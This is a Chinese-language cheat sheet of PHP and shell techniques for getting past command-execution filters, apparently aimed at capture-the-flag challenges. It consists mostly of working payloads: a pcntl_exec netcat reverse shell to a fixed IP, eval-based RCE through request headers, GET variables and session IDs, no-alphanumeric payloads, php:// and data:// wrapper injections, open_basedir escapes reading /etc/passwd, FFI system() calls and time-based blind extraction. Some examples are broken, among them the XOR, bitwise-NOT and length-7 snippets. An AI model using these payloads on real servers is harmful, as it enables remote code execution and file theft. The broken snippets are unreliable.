### 1. `pcntl` 扩展绕过 ⚙️

**核心原理：**

`pcntl_exec` 函数在当前进程空间内执行指定的程序。如果能调用此函数，并且目标系统上存在可用的 shell (如 `bash`, `sh`) 或其他可执行程序 (如 `nc`)，则可以利用它执行任意命令。

**函数定义：**

`pcntl_exec(string $path, array $args = ?, array $envs = ?)`

* `$path`: 必须是可执行二进制文件的路径，或者是一个在文件第一行指定了可执行文件路径标头（shebang `#!`）的脚本。例如 `#!/bin/bash`。
* `$args`: 一个字符串数组，作为参数传递给程序。
* `$envs`: 一个字符串数组，作为环境变量传递给程序。

**利用示例：**

```php
<?php
// 利用 #!/bin/bash 来执行 nc 反弹 shell
pcntl_exec("/bin/bash", array("-c", "nc 192.168.1.201 7777 -e /bin/bash"));
// 或者直接指定 nc 路径 (如果知道)
// pcntl_exec("/bin/nc", array("192.168.1.201", "7777", "-e", "/bin/bash"));
?>
```

**无回显问题与解决：**

`pcntl_exec` 函数本身不提供命令执行后的回显。

* **解决方法一：输出重定向**
    将命令执行结果输出到 Web 服务器有权限访问的目录下，然后通过 HTTP 请求查看该文件内容。
    例如：`pcntl_exec("/bin/bash", array("-c", "ls / > /var/www/html/output.txt"));`
* **解决方法二：反弹 Shell**
    直接建立一个反弹 shell，通过该 shell 进行交互式命令执行，从而看到结果。
    示例见上方的 `nc` 命令。

---

### 2. 文件名过滤绕过 (混淆) 📄

**核心原理：**

当目标对读取或操作的文件名进行过滤时（例如，过滤 `flag` 关键字），可以通过多种shell特性或PHP字符串特性来混淆文件名，从而绕过检测。

**绕过技巧：**

* **引号混淆：**
    在文件名中插入单引号 (`'`) 或双引号 (`""`)。Shell 通常会将这些引号间的内容或引号本身视为空白或连接符。
    * `cat fl""ag"".php`
    * `cat fl''ag''.php`
* **反斜杠转义：**
    使用反斜杠 (`\`) 转义字符，可能使过滤规则失效。
    * `cat fl\ag\.php` (这里 `\.` 会被shell解释为 `.`)
* **特殊变量插入 (Shell)：**
    在 Shell 环境中，某些未定义的变量或特殊变量（如 `$1` 到 `$9`, `$@`, `$*` 在特定上下文中可能为空）在展开时为空字符串，可以插入到文件名中进行混淆。
    * `cat f$1lag.php` (如果 `$1` 未定义或为空)
* **环境变量与切片 (Shell)：**
    利用 Linux Shell 中已存在的环境变量，通过切片和拼接构造出目标字符。
    * 例如，假设需要 `flag`：
        `echo f${PATH:5:1}${PATH:8:1}g` (这里假设 `${PATH:5:1}` 是 `l`，`${PATH:8:1}` 是 `a`，具体偏移量和环境变量需根据实际情况确定)
        然后可以用 `cat $(echo f${PATH:5:1}${PATH:8:1}g)`

---

### 3. 文件读取命令过滤绕过 📖

**核心原理：**

当常用的文件读取命令（如 `cat`）被禁用时，可以使用其他功能相似或可以间接实现文件读取的命令。

**替代命令列表：**

* `tac`: 反向显示文件内容 (从最后一行到第一行)。
* `more`: 分页显示文件内容。
* `less`: 与 `more` 类似，但功能更强大。
* `head`: 显示文件开头部分。
* `tail`: 显示文件末尾部分。
* `nl`: 显示文件内容并加上行号。
* `od -A d -c -d <文件名>`: 以八进制、字符、十进制等多种形式转储文件内容。
* `xxd <文件名>`: 以十六进制形式转储文件内容，也可以转回。
* `sort <文件名>`: 对文件内容进行排序后输出（原内容可见）。
* `uniq <文件名>`: 报告或忽略重复行（通常与 `sort` 结合，但单独使用也能显示内容）。
* `file -f <文件名>`: （`-f` 通常用于读取文件名列表，但直接跟文件名有时也能显示少量内容或类型）。更常见的是 `file <文件名>` 获取文件类型。
* `grep <任意字符> <文件名>`: 查找并显示包含指定模式的行。
* `strings <文件名>`: 显示文件中的可打印字符序列。

---

### 4. 无回显时间盲注 ⏳

**核心原理：**

当命令执行无直接回显时，可以通过构造条件命令，并根据其执行时间差异来逐字符推断信息。这通常依赖于 `sleep` 命令或类似的耗时操作。

**利用步骤与技巧：**

1.  **判断存在性与行数：**
    * 使用 `sleep <秒数>` 结合条件判断。如果条件为真，则执行 `sleep`，导致响应延迟。
    * `if [ $(cat flag.php | wc -l) -gt 0 ]; then sleep 5; fi` (判断文件是否有内容)
2.  **逐行判断内容：**
    * `awk NR==<行号>`: 用于提取特定行。
    * `cat flag.php | awk NR==1` (提取第一行)
3.  **逐字符判断：**
    * `cut -c <字符位置>`: 用于提取特定位置的字符。
    * `cat flag.php | awk NR==1 | cut -c 5` (提取第一行的第5个字符)
4.  **构造盲注语句：**
    结合 `if` 条件和 `sleep` 进行盲注。
    ```bash
    # 判断第一行第一个字符是否为 'a'
    if [ $(cat flag.php | awk NR==1 | cut -c 1) == 'a' ]; then sleep 5; fi
    # 判断第一行第一个字符的 ASCII 值 (示例，可以用 test 或 [[ ... ]] -eq)
    if [ $(printf '%d' "'$(cat flag.php | awk NR==1 | cut -c 1)") -eq 97 ]; then sleep 5; fi
    ```
    通过遍历字符集和观察响应时间，可以逐个猜解出文件内容。

---

### 5. 命令长度限制绕过 (长度为 7) 📏

**核心原理：**

当服务器端对用户输入的每条命令或命令片段有严格的长度限制（例如，每个通过特定方式提交的“单词”不能超过7个字符）时，需要将长命令拆分成多个符合长度限制的小块，并通过重定向、管道或分步执行来组合它们。

**利用示例：**

```bash
# 目标: ls -t > a; sh a;
# 将 'ls -t > a' 写入文件 a
>ls\ -t\ 
> a
# 执行 a 文件中的命令
sh a

# 目标: nc 192.168.1.161 7777 | bash
# 将命令分块写入文件，最后执行
>bash
>\|n\ c\ 
>192.\ 
>168.\ 
>1.\ 
>161\ 
>7777
# 假设上述命令被组合到一个文件中（例如 x）
sh x
```

---

### 6. 命令长度限制绕过 (长度为 5) 📏

**核心原理：**

与长度为7的绕过类似，但限制更严格。需要将命令拆分成更小的块，通常利用重定向 `>` 和 `>>` 来逐步构建命令脚本。

**利用示例：**

```bash
# 目标: ls -t > y
ls>y
ls>>y
echo \ >y # 写入空格
echo -t>>y

# 执行脚本
sh y
```

---

### 7. 命令长度限制绕过 (长度为 4) 📏

**核心原理：**

限制最为严格，需要极细致的命令拆分和利用通配符 `*`、`?` 或 `rev` 命令等技巧。

**利用示例：**

```bash
# 目标: ls -t > g; sh g
# 创建一个包含 'ls -t' 的文件 g
echo sl>g
rev g>v
cat v>g # g 的内容是 'ls'
echo \ >>g
echo -t>>g

# 执行脚本
sh g

# 另一个例子：通过 rev 命令反转构造
>rev
*>v  # 将 rev 的内容（文件名本身）写入 v
rev v>x # 反转 v 的内容写入 x，如果 v 的内容是 'rev'，x 的内容是 'ver'
# 这种方法需要巧妙地利用已有文件名和通配符
```

---

### 8. 无参数命令执行 (请求头绕过 - PHP 7.3+) 🤯

**核心原理：**

利用 `getallheaders()` 函数 (或其别名 `apache_request_headers()`) 读取所有 HTTP 请求头信息，该函数返回一个包含所有请求头的数组。如果能控制请求头的内容，并且有办法将请求头中的字符串作为代码执行，则可以实现远程命令执行。`pos()` 函数返回数组的第一个元素。

**利用示例：**

```php
// 目标代码:
eval(pos(getallheaders()));
// 或:
eval(current(getallheaders()));
```

**攻击方式：**

在 HTTP 请求中，将恶意 PHP 代码放在第一个请求头的值中 (或者修改请求，使得恶意请求头成为数组的第一个元素)。

例如，发送如下请求：

```http
GET /vuln.php HTTP/1.1
Host: example.com
X-Malicious-Code: system('ls');
User-Agent: ...
...
```

如果 `X-Malicious-Code` 是 `getallheaders()` 返回数组的第一个元素 (顺序可能依赖于服务器和PHP版本)，那么 `pos(getallheaders())` 就会返回 `system('ls');`，然后被 `eval()` 执行。攻击者通常会尝试将恶意代码放在一个自定义的、字典序靠前的头部。

---

### 9. 无参数命令执行 (全局变量 RCE - PHP 5/7) 🌍

**核心原理：**

`get_defined_vars()` 函数返回一个包含所有已定义变量的多维数组，包括超全局变量 (如 `$_GET`, `$_POST`)。通过控制传入的 GET/POST 参数，这些参数会出现在 `$_GET` 或 `$_POST` 数组中。通过数组操作函数（如 `pos()`, `end()`, `next()` 等）可以提取出这些受控的参数值，并将其传递给代码执行函数。

**利用示例：**

```php
// 目标代码:
eval(end(pos(get_defined_vars())));
// pos() 取出第一个大数组元素，通常是 $_GET，然后 end() 取出 $_GET 数组的最后一个元素
```

**攻击方式：**

发送 GET 请求，并将恶意代码作为最后一个 GET 参数的值。
`http://example.com/vuln.php?a=1&b=2&cmd=system('ls');`

在此例中：
1.  `get_defined_vars()` 返回一个大数组，其中第一个元素是 `$_GET` 数组 `['a' => '1', 'b' => '2', 'cmd' => "system('ls');"]`。
2.  `pos(...)` 返回该 `$_GET` 数组。
3.  `end(...)` 返回 `$_GET` 数组的最后一个元素的值，即 `"system('ls');"`。
4.  `eval("system('ls');")` 执行命令。

---

### 10. 无参数命令执行 (Session RCE - PHP 5) 🍪

**核心原理：**

`session_id()` 函数可以获取或设置当前会话的 ID。如果先调用 `session_start()` 启动会话，用户可通过 Cookie 控制传入的 PHPSESSID。如果其内容可以被转换成可执行的代码（例如通过 `hex2bin()`），则可以实现 RCE。

**利用示例：**

```php
// 目标代码:
eval(hex2bin(session_id(session_start())));
```

**攻击方式：**

1.  构造 PHP payload，例如 `system('ls');`。
2.  将此 payload 转换为十六进制字符串: `73797374656d28276c7327293b`
3.  设置请求中的 `PHPSESSID` Cookie 的值为此十六进制字符串。
4.  访问目标页面，代码被 `hex2bin` 解码后由 `eval` 执行。

---

### 11. 无参数命令执行 (组合函数利用) 🧩

**核心原理：**

当没有直接的参数传递给代码执行函数时，可以通过组合 PHP 内置的各种数组、目录、字符串和文件读取函数，间接地构造出文件名或代码字符串，并最终实现文件读取或代码执行。

**常用函数列表 (部分)：**

* **目录/文件扫描与定位：** `scandir()`, `getcwd()`, `dirname()`, `glob()`
* **数组指针与提取：** `current()`, `pos()`, `next()`, `end()`, `array_reverse()`, `array_pop()`
* **字符串与编码：** `strrev()`, `chr()`, `hex2bin()`, `base64_decode()`
* **信息获取：** `localeconv()` (可获取 `.`)
* **最终执行/读取：** `show_source()`, `highlight_file()`, `readfile()`, `file_get_contents()`, `include`

**利用链示例：**

* **读取当前目录下的随机文件名内容：**
    `show_source(array_rand(array_flip(scandir(current(localeconv())))));`
    * `current(localeconv())` 获取 `.` (点号)。
    * `scandir('.')` 列出当前目录。
    * `array_flip()` + `array_rand()` 随机选取一个文件名。
    * `show_source()` 显示该文件源码。

* **读取上级目录的文件：**
    `show_source(next(array_reverse(scandir(dirname(getcwd())))));`
    * `getcwd()` 获取当前工作目录。
    * `dirname()` 获取上级目录路径。
    * `scandir()` 列出上级目录内容。
    * `array_reverse()` 反转数组，使 `.` 和 `..` 在末尾。
    * `next()` 跳过 `.`，获取 `..` 的上一个文件/目录名（取决于目录内容）。

---

### 12. 无字母数字 RCE (异或运算绕过) 🎨

**核心原理：**

当 WAF 严格限制输入，不允许使用字母和数字时，可以通过 PHP 的位运算（尤其是异或 `^`）来构造出所需的字母和数字。PHP 在对字符串进行位运算时，会逐字节对字符的 ASCII 值进行操作。

**构造思路与执行：**

通过对非字母、数字的特殊字符（如 `(`, `)`, `[`, `]`, `~`, `!`, `@`, `#` 等）进行异或运算，可以得到目标字符。然后将这些字符拼接成函数名和参数字符串。

**利用示例 (PHP 5):**

```php
<?php
// 目标: assert($_POST['_']);

// 构造 "assert" -> ('['^'|') gives 'a', etc.
$a = "assert";
// 构造 "_POST"
$b = "_POST";

$c = $$b;      // 动态变量 $$b 等于 $_POST
$a($c['_']);  // 执行 assert($_POST['_'])
?>
```
**利用示例 (PHP 7):**

```php
<?php
// 目标: `$_POST['_']`; (反引号执行命令)

// 构造 "_POST"
$_ = "_POST";
// 构造 $__ = $_POST
$__ = $$_;

`$__['_']`; // 执行 `$_POST['_']`;
?>
```

---

### 13. 无字母数字 RCE (取反运算绕过) 🔄

**核心原理：**

与异或类似，按位取反运算 (`~`) 也可以用来从非字母数字字符构造出字母数字字符。PHP 中的取反运算是对字符串的每个字节进行操作。

**构造思路与执行：**

通过对一系列非字母数字字符进行取反，然后拼接，可以得到一个乱码字符串。这个字符串可能是某个函数名或 payload 的 URL 编码形式，PHP 在某些上下文中会自动解码。

**利用示例：**

```php
<?php
// 目标：执行 _GET[1](_GET[2])
// 例如: ?1=system&2=ls

// (~"sl'h") -> "_GET"
$_ = (~"sl'h");
// ($$_)[1] -> $_GET[1] -> "system"
// ($$_)[2] -> $_GET[2] -> "ls"
${$_}[1](${$_}[2]);
?>
```

---

### 14. 无字母数字特殊符号绕过 ⚠️

**核心原理：**

当连 `_` (下划线)、`$` (美元符号) 等常见辅助字符也被过滤时，需要更高级的技巧。

**绕过技巧：**

* **过滤 `_` 和 `$` (PHP 7)：**
    可以使用 `(函数名字符串)(参数)` 的方式动态调用函数。
    * `('phpinfo')();`
    * `('system')('ls');`
    这些字符串本身可以通过前面介绍的异或、取反等方法构造。

* **过滤 `_` 和 `$` (PHP 5，利用文件上传)：**
    当 POST 方法上传文件时，PHP 会将上传的文件保存在临时目录（如 `/tmp`），默认文件名是 `phpXXXXXX`。这个临时文件名可以被猜测或通过通配符匹配并执行。
    * **Payload:** `?cmd=. /???/????????`
    * **攻击流程:**
        1.  上传一个内容为 shell 脚本的文件。
        2.  发送上述 GET 请求，其中 `???/????????` 是用来匹配 `/tmp/phpXXXXXX` 的通配符，`.` 命令（source）会执行该脚本。

* **过滤大多数符号 (自增运算符绕过)：**
    可以利用 PHP 的自增 (`++`) /自减 (`--`) 运算符配合数组和字符串转换。通过对未定义常量进行字符串化（结果为常量名字符串），然后取其字符，再进行自增运算，可以得到 ASCII 序上的下一个字符，从而逐个构造出函数名和参数。

---

### 15. 文件包含绕过 (利用封装协议) 🎁

**核心原理：**

当命令执行函数被过滤，但文件包含函数（如 `include`, `require`）可用时，可以利用 PHP 支持的各种封装协议 (wrappers) 来读取文件内容或执行代码。

**常用封装协议与利用：**

* **`php://filter` (用于读取文件)：**
    可以对读取的文件内容进行编码转换，常用于读取 PHP 文件源码。
    * **Payload:** `?file=php://filter/read=convert.base64-encode/resource=flag.php`
    * **效果:** `flag.php` 的内容会被 base64 编码后输出到页面，解码即可。

* **`data://` (用于命令执行)：**
    允许将数据直接作为文件内容进行包含执行。
    * **Payload (plain text):** `?file=data://text/plain,<?php system('ls');?>`
    * **Payload (base64):** `?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+`
    * **效果:** `include` 会执行逗号或 base64 解码后的 PHP 代码。

* **`file://` (用于读取本地文件)：**
    直接包含本地文件系统中的文件。
    * **Payload:** `?file=file:///etc/passwd`

* **`expect://` (用于命令执行，需安装 `expect` 扩展)：**
    如果 PHP 安装了 `expect` 扩展，此协议可直接执行系统命令。
    * **Payload:** `?file=expect://ls`

---

### 16. `open_basedir` 绕过 📂

**核心原理：**

`open_basedir` 是 PHP 的安全配置，用于将用户的文件操作限制在指定目录下。绕过的核心思想是利用某些函数或特性的逻辑漏洞，使其在执行路径计算或检查时脱离这个限制。

**绕过技巧：**

* **`symlink()` 函数绕过 (PHP < 8):**
    通过创建多层符号链接，然后删除中间链接并替换为同名目录，可以欺骗路径解析机制，使最终的符号链接指向 `open_basedir` 限制之外的路径。
    ```php
    <?php
    mkdir("A"); chdir("A");
    mkdir("B"); chdir("B");
    mkdir("C"); chdir("C");
    mkdir("D"); chdir("D");
    chdir("../../../../");
    symlink("A/B/C/D", "link_dir");
    symlink("link_dir/../../../../etc/passwd", "exp");
    unlink("link_dir");
    mkdir("link_dir");
    // 访问 exp 文件即可读取 /etc/passwd
    ?>
    ```

* **`glob://` 伪协议绕过 (PHP 5.3+) (仅列目录):**
    `glob://` 伪协议可以与 `DirectoryIterator` 或 `opendir()` 等函数结合，用于列出根目录下的文件和目录，无视 `open_basedir` 限制。但通常不能读取文件内容或列出非根目录。
    ```php
    <?php
    // Payload: ?dir=glob:///*
    $it = new DirectoryIterator($_GET['dir']);
    foreach($it as $f) {
        echo $f->getFilename() . "<br>";
    }
    ?>
    ```

* **`chdir()` 与 `ini_set()` 组合绕过:**
    通过 `chdir('..')` 逐层向上跳转目录，同时使用 `ini_set('open_basedir', 'new_path')` 不断放宽限制，最终可以将 `open_basedir` 设置为 `/`，从而解除限制。
    ```php
    <?php
    // Payload: ?c=mkdir('d');chdir('d');ini_set('open_basedir','..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/etc/passwd');
    eval($_GET['c']);
    ?>
    ```

* **`bindtextdomain()` / `SplFileInfo::getRealPath()` 报错绕过 (仅判断文件存在性):**
    这些函数在处理不存在的路径时会报错，但如果路径存在，即使在 `open_basedir` 之外，也会返回路径字符串或 `false`，可以此来判断远程文件或目录是否存在。
    ```php
    <?php
    // Payload: ?dir=/etc/passwd
    var_dump(bindtextdomain('domain', $_GET['dir']));
    $info = new SplFileInfo($_GET['dir']);
    var_dump($info->getRealPath());
    ?>
    ```

---

### 17. 数据库查询读文件 🗄️

**核心原理：**

当 PHP 代码可以连接并执行数据库查询时，可以利用数据库自身的函数来读取服务器上的文件，从而绕过 PHP 层面的文件读取限制。最常用的函数是 MySQL 的 `load_file()`。

**利用示例：**

* **PDO:**
    ```php
    <?php
    try {
        $dbh = new PDO('mysql:host=localhost;dbname=test', 'user', 'pass');
        foreach($dbh->query('SELECT load_file("/etc/passwd") as f') as $row) {
            echo $row['f'];
        }
    } catch (PDOException $e) {
        // handle error
    }
    ?>
    ```

* **mysqli:**
    ```php
    <?php
    $conn = mysqli_connect("127.0.0.1", "root", "root", "test");
    $sql = "SELECT load_file('/etc/passwd') as f";
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_array($result);
    echo $row['f'];
    ?>
    ```

---

### 18. FFI 执行命令 (PHP >= 7.4) 🗽

**核心原理：**

FFI (Foreign Function Interface) 是 PHP 7.4 引入的扩展，允许 PHP 代码调用 C 语言编写的函数。通过 FFI，可以直接定义并调用标准 C 库中的 `system()` 函数，从而执行任意系统命令。

**利用示例：**

```php
<?php
// 检查 FFI 是否可用
if (!class_exists('FFI')) {
    die('FFI not available');
}
// 定义 C 函数原型
$ffi = FFI::cdef("int system(const char *command);");
// 调用 system 函数执行命令
$ffi->system("ls -la > /tmp/output.txt");
// 无直接回显，需要重定向输出或使用反弹 shell
?>
```

---

### 19. 环境变量绕过 🌎

**核心原理：**

当 WAF 过滤了命令中的字母、数字或特定字符时，可以利用 Shell 的环境变量和参数扩展（Parameter Expansion）来构造命令字符串。例如，`${PATH}`、`${PWD}`、`${#}` 等变量和操作符可以用来切片和拼接，生成所需字符。

**利用示例：**

假设需要构造 `/bin/cat flag.php`，但不能使用字母。

* `/${PWD:${#}:${##}}` -> `/` (利用 `${#}=0` 和 `${##}=1` 来切片)
* `${PATH:~A}` -> 取 `$PATH` 的最后一位字符
* `${HOME::$?}` -> 取 `$HOME` 的第一位字符

**组合Payload:**
`/${PWD:${#}:${##}}???/${PWD:${#}:${##}}??${#?} ${PWD:~A}???`
(此 payload 高度依赖特定系统环境和 Shell 变量的值，需要精确构造)

---

### 20. 数学与进制转换函数绕过 🔢

**核心原理：**

当字母被过滤时，可以使用 PHP 的数学和进制转换函数（如 `base_convert()`, `dechex()`, `hex2bin()`）来动态生成包含字母的字符串，如函数名 `system` 或超全局变量名 `_GET`。

**利用示例：**

* `base_convert('37907361743', 10, 36)` 会返回字符串 `'hex2bin'`。
* `dechex('1598506324')` 会返回 `'5f474554'`，即 `_GET` 的十六进制表示。

**组合Payload:**

```php
// 目标: system($_GET[1]);
// URL: ?c=...&1=ls

?c=$a=base_convert(37907361743,10,36); // $a = 'hex2bin'
$b=$a(dechex(1598506324)); // $b = hex2bin('5f474554') -> '_GET'
$c=$$b; // $c = $_GET
$d=base_convert(1751504350,10,36); // $d = 'system'
$d($c[1]); // system($_GET[1]) -> system('ls')
```